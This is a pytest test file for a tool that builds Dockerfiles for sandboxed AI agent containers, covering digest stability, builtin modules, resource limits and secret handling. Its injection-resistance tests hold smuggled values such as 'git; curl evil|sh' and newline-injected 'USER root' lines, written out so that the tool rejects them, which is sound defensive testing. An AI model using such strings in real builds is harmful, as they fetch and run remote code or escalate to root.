from __future__ import annotations

import pytest
from pydantic import ValidationError

from jormungandr.runtime.compose import compose
from jormungandr.runtime.modules import builtin  # noqa: F401  (registers builtins)
from jormungandr.runtime.modules.base import ModuleError
from jormungandr.runtime.spec import ContainerSpec, ImageSpec, ResourceLimits


def spec(**kwargs) -> ImageSpec:
    return ImageSpec(target_platform="linux/arm64", **kwargs)


class TestCompose:
    def test_minimal_image(self) -> None:
        result = compose(spec(base_image="debian:trixie-slim"))
        assert "FROM debian:trixie-slim" in result.dockerfile
        assert result.reference.startswith("jormungandr:")
        assert result.module_names == ()

    def test_platform_is_not_baked_into_from(self) -> None:
        # BuildKit rejects a constant --platform in FROM, and it would fight
        # buildx's own flag. It reaches the build as a command-line argument.
        assert "--platform" not in compose(spec()).dockerfile

    def test_deterministic(self) -> None:
        a = compose(spec(modules=[{"name": "apt", "packages": ["git", "curl"]}]))
        b = compose(spec(modules=[{"name": "apt", "packages": ["git", "curl"]}]))
        assert a.dockerfile == b.dockerfile
        assert a.digest == b.digest

    def test_module_declaration_order_does_not_change_the_image(self) -> None:
        a = compose(spec(modules=[{"name": "node"}, {"name": "apt", "packages": ["git"]}]))
        b = compose(spec(modules=[{"name": "apt", "packages": ["git"]}, {"name": "node"}]))
        assert a.digest == b.digest

    def test_apt_package_order_does_not_change_the_image(self) -> None:
        a = compose(spec(modules=[{"name": "apt", "packages": ["git", "curl"]}]))
        b = compose(spec(modules=[{"name": "apt", "packages": ["curl", "git"]}]))
        assert a.digest == b.digest

    def test_changing_a_package_changes_the_digest(self) -> None:
        a = compose(spec(modules=[{"name": "apt", "packages": ["git"]}]))
        b = compose(spec(modules=[{"name": "apt", "packages": ["git", "jq"]}]))
        assert a.digest != b.digest

    def test_changing_the_base_image_changes_the_digest(self) -> None:
        a = compose(spec(base_image="debian:trixie-slim"))
        b = compose(spec(base_image="ubuntu:24.04"))
        assert a.digest != b.digest

    def test_changing_the_platform_changes_the_digest(self) -> None:
        a = compose(ImageSpec(target_platform="linux/arm64"))
        b = compose(ImageSpec(target_platform="linux/amd64"))
        assert a.digest != b.digest

    def test_stage_ordering_in_rendered_output(self) -> None:
        result = compose(
            spec(
                modules=[
                    {"name": "workspace"},
                    {"name": "langfuse"},
                    {"name": "agent", "harness": "claude-code"},
                    {"name": "node"},
                    {"name": "python"},
                    {"name": "apt", "packages": ["git"]},
                ]
            )
        )
        text = result.dockerfile
        order = [
            text.index("apt packages"),
            text.index("node 22"),
            text.index("agent harness"),
            text.index("langfuse tracing"),
            text.index("workspace /workspace"),
        ]
        assert order == sorted(order)

    def test_labels_are_stamped(self) -> None:
        result = compose(spec(modules=[{"name": "apt", "packages": ["git"]}]))
        assert f"dev.jormungandr.digest={result.digest}" in result.dockerfile
        assert "dev.jormungandr.managed=true" in result.dockerfile
        assert "dev.jormungandr.modules=apt" in result.dockerfile

    def test_digest_label_is_excluded_from_the_hash(self) -> None:
        # The LABEL carrying the digest is appended after hashing; if it were
        # hashed the value would be self-referential and never stabilise.
        # Asserting only "the digest appears in the file" is vacuous — it holds
        # either way. Hashing the *final* text must give a different answer,
        # which is only true if the label really was excluded.
        from jormungandr.runtime.identity import content_digest

        result = compose(spec())
        assert result.digest in result.dockerfile
        rehashed = content_digest(
            dockerfile=result.dockerfile,
            context_files=result.context_files,
            context_modes=result.context_modes,
        )
        assert rehashed != result.digest, "digest label leaked into its own hash"

    def test_custom_labels_merge(self) -> None:
        result = compose(spec(labels={"owner": "nejc"}))
        assert "owner=nejc" in result.dockerfile

    def test_build_args_are_rendered_and_hashed(self) -> None:
        a = compose(spec(build_args={"FOO": "1"}))
        b = compose(spec(build_args={"FOO": "2"}))
        assert "ARG FOO=1" in a.dockerfile
        assert a.digest != b.digest

    def test_unknown_module_is_a_clear_error(self) -> None:
        with pytest.raises(ModuleError, match="unknown module 'nope'"):
            compose(spec(modules=[{"name": "nope"}]))


class TestBuiltinModules:
    def test_script_lands_in_the_build_context(self) -> None:
        result = compose(
            spec(modules=[{"name": "script", "content": "echo hello"}])
        )
        assert result.context_files["script.sh"] == "echo hello\n"
        assert result.context_modes["script.sh"] == 0o755
        assert "COPY script.sh /opt/jormungandr/script.sh" in result.dockerfile

    def test_editing_a_script_busts_the_cache(self) -> None:
        a = compose(spec(modules=[{"name": "script", "content": "echo a"}]))
        b = compose(spec(modules=[{"name": "script", "content": "echo b"}]))
        assert a.digest != b.digest

    def test_agent_cli_pins_version(self) -> None:
        result = compose(
            spec(
                modules=[
                    {"name": "node"},
                    {"name": "agent", "harness": "claude-code", "version": "1.2.3"},
                ]
            )
        )
        assert "npm install -g @anthropic-ai/claude-code@1.2.3" in result.dockerfile

    def test_agent_version_change_busts_the_cache(self) -> None:
        def build(version: str) -> str:
            return compose(
                spec(
                    modules=[
                        {"name": "node"},
                        {"name": "agent", "harness": "claude-code", "version": version},
                    ]
                )
            ).digest

        assert build("1.2.3") != build("1.2.4")

    def test_unknown_harness_is_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unknown harness"):
            compose(spec(modules=[{"name": "agent", "harness": "ghost"}]))

    def test_agent_requires_node(self) -> None:
        with pytest.raises(ModuleError, match="requires 'node'"):
            compose(spec(modules=[{"name": "agent", "harness": "codex"}]))

    def test_langfuse_bakes_endpoint_but_not_credentials(self) -> None:
        result = compose(spec(modules=[{"name": "python"}, {"name": "langfuse"}]))
        assert "OTEL_EXPORTER_OTLP_ENDPOINT" in result.dockerfile
        assert "SECRET_KEY" not in result.dockerfile
        assert "PUBLIC_KEY" not in result.dockerfile

    def test_langfuse_is_opt_in(self) -> None:
        # The case Teich handles with ARG + if-branches inside RUN layers.
        assert "langfuse" not in compose(spec()).dockerfile

    def test_apt_uses_a_cache_mount(self) -> None:
        result = compose(spec(modules=[{"name": "apt", "packages": ["git"]}]))
        assert "--mount=type=cache,target=/var/cache/apt" in result.dockerfile

    def test_apt_needs_packages(self) -> None:
        with pytest.raises(ModuleError, match="at least one package"):
            compose(spec(modules=[{"name": "apt", "packages": []}]))

    def test_workspace_sets_user_last(self) -> None:
        result = compose(spec(modules=[{"name": "workspace"}]))
        lines = [ln for ln in result.dockerfile.splitlines() if ln.startswith(("USER", "LABEL"))]
        assert lines[0].startswith("USER agent")


class TestImageSpec:
    def test_duplicate_modules_rejected(self) -> None:
        with pytest.raises(ValidationError, match="declared twice"):
            ImageSpec(modules=[{"name": "node"}, {"name": "node"}])

    def test_bad_platform_rejected(self) -> None:
        with pytest.raises(ValidationError, match="expected os/arch"):
            ImageSpec(target_platform="arm64")

    def test_frozen(self) -> None:
        with pytest.raises(ValidationError):
            ImageSpec().base_image = "other"  # type: ignore[misc]

    def test_unknown_field_rejected(self) -> None:
        with pytest.raises(ValidationError):
            ImageSpec(typo=True)  # type: ignore[call-arg]


class TestResourceLimits:
    def test_defaults_are_set(self) -> None:
        # Neither reference implementation sets any limits at all.
        args = ResourceLimits().docker_args()
        assert "--cpus" in args and "--memory" in args and "--pids-limit" in args

    def test_size_validation(self) -> None:
        with pytest.raises(ValidationError, match="invalid size"):
            ResourceLimits(memory="lots")

    def test_size_normalised(self) -> None:
        assert ResourceLimits(memory="4G").memory == "4g"

    def test_limits_can_be_disabled_explicitly(self) -> None:
        assert ResourceLimits(cpus=None, memory=None, pids=None, nofile=None).docker_args() == []


class TestContainerSpec:
    def test_secret_env_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="refusing to pass"):
            ContainerSpec(image="x", env={"LANGFUSE_SECRET_KEY": "sk-1"})

    def test_api_key_env_is_refused(self) -> None:
        with pytest.raises(ValidationError, match="refusing to pass"):
            ContainerSpec(image="x", env={"ANTHROPIC_API_KEY": "sk-ant"})

    def test_ordinary_env_is_fine(self) -> None:
        assert ContainerSpec(image="x", env={"LANGFUSE_HOST": "https://h"}).env

    def test_secure_defaults(self) -> None:
        container = ContainerSpec(image="x")
        assert container.no_new_privileges
        assert container.cap_drop_all
        assert container.init


class TestDigestCoversEverythingThatChangesTheImage:
    """Regression tests: an input that changes the image must change the tag.

    Anything missed here means a stale image is silently reused.
    """

    def test_labels_are_in_the_digest(self) -> None:
        # Labels are rendered into the Dockerfile, so they are part of the
        # image. Omitting them let two differently-labelled images share a tag,
        # with the second build skipped and the first image's labels left in
        # place — breaking the label-based discovery the tool relies on.
        a = compose(spec(labels={"experiment": "run-A"}))
        b = compose(spec(labels={"experiment": "run-B"}))
        assert a.digest != b.digest

    def test_label_order_does_not_matter(self) -> None:
        a = compose(spec(labels={"x": "1", "y": "2"}))
        b = compose(spec(labels={"y": "2", "x": "1"}))
        assert a.digest == b.digest

    def test_context_file_mode_is_in_the_digest(self) -> None:
        from jormungandr.runtime.identity import content_digest

        a = content_digest(dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o644})
        b = content_digest(dockerfile="F", context_files={"s": "x"}, context_modes={"s": 0o755})
        assert a != b

    def test_repository_change_is_visible_in_the_reference(self) -> None:
        a = compose(spec(repository="one"))
        b = compose(spec(repository="two"))
        assert a.reference != b.reference


class TestInjectionResistance:
    """Module config is interpolated into shell command bodies.

    A newline does not escape a string here — it ends the instruction and
    starts a new one, so it needs no attacker to corrupt a Dockerfile.
    """

    def test_newline_in_apt_package_is_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "apt", "packages": ["git\nUSER root"]}]))

    def test_shell_metacharacters_in_apt_package_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "apt", "packages": ["git; curl evil|sh"]}]))

    def test_string_uid_is_rejected(self) -> None:
        # ModuleDeclaration allows extra fields without type coercion, so YAML
        # hands the int-annotated uid whatever was written.
        with pytest.raises(ModuleError, match="uid must be an integer"):
            compose(spec(modules=[{"name": "workspace", "uid": "0 --groups root; evil"}]))

    def test_injection_via_workspace_user_rejected(self) -> None:
        with pytest.raises(ModuleError, match="unsafe"):
            compose(spec(modules=[{"name": "workspace", "user": "a; curl evil|sh"}]))

    def test_version_specifiers_are_quoted_not_rejected(self) -> None:
        # `langfuse>=3,<4` and `^1.2.3` are legitimate pins; quoting keeps them
        # intact and inert rather than banning them.
        result = compose(
            spec(
                modules=[
                    {"name": "python"},
                    {"name": "langfuse", "version": ">=3,<4"},
                    {"name": "node"},
                    {"name": "agent", "harness": "codex", "version": "^1.2.3"},
                ]
            )
        )
        assert "'langfuse>=3,<4'" in result.dockerfile
        assert "'@openai/codex@^1.2.3'" in result.dockerfile

    def test_newline_in_version_is_still_rejected(self) -> None:
        with pytest.raises(ModuleError, match="newline"):
            compose(
                spec(
                    modules=[
                        {"name": "node"},
                        {"name": "agent", "harness": "codex", "version": "1\nUSER root"},
                    ]
                )
            )

    def test_newline_in_build_arg_is_rejected(self) -> None:
        from jormungandr.runtime.layers import DockerfileError

        with pytest.raises(DockerfileError, match="newline"):
            compose(spec(build_args={"A\nUSER root\nRUN echo pwned": "1"}))

    def test_newline_in_label_is_rejected(self) -> None:
        from jormungandr.runtime.layers import DockerfileError

        with pytest.raises(DockerfileError, match="newline"):
            compose(spec(labels={"a": "1\nUSER root"}))
